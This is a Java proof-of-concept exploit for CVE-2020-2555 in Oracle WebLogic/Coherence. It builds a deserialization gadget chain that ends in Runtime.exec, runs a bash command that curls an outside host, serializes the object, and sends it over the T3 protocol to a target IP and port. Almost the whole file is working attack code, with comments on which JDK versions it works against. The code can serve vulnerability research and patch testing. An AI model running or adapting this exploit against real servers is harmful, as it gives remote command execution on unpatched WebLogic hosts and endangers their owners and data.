package com.r17a.weblogic.cve;

// com.com.supeream from https://github.com/5up3rc/weblogic_cmd/
// com.tangosol.util.extractor.ChainedExtractor from coherence.jar

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

/*
 * author:Y4er.com
 *
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.util.extractor.ChainedExtractor.extract()
 *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
 *                      Method.invoke()
 *                      ...
 *                      Runtime.getRuntime.exec()
 */

public class CVE_2020_2555 {

    public static void main(String[] args) throws Exception {

        // Runtime.class.getRuntime()
        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"getRuntime", new Class[0]}

        );

        // get invoke() to execute exec()
        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{null, new Object[0]}

        );

        // invoke("exec","calc")
        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "exec",
                new Object[]{new String[]{"/bin/bash", "-c", "curl http://172.16.1.1/success"}}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        // BadAttributeValueExpException toString()
        // This only works in JDK 8u76 and WITHOUT a security manager
        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        // serialize
        byte[] payload = Serializables.serialize(badAttributeValueExpException);

        // T3 send, you can also use python script. weblogic_t3.py
        T3ProtocolOperation.send("172.16.1.130", "7001", payload);

        // test
        serialize(badAttributeValueExpException);
//        deserialize();

    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
